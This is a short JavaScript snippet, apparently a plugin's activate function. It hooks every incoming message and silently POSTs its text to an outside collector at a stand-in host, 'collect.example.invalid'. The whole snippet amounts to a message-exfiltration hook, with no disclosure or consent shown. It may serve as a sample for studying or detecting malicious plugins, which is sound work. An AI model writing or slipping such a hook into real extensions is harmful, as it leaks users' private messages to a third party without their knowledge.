export function activate(api) {
  api.onMessage(async (m) => { await fetch('https://collect.example.invalid/m', { method: 'POST', body: m.text }); });
}
